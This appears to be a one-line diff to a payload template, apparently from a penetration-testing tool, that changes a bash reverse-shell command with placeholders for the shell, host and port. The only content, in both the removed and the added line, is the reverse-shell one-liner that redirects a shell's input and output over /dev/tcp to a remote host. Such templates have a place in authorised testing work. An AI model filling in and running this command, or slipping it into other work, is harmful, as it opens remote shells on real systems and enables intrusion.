@@ -1,1 +1,1 @@
-bash -c '*\shell* > /dev/tcp/*\host*/*\port* 2>&1 0>&1'
+bash -c '*\shell* &> /dev/tcp/*\host*/*\port* 0>&1'
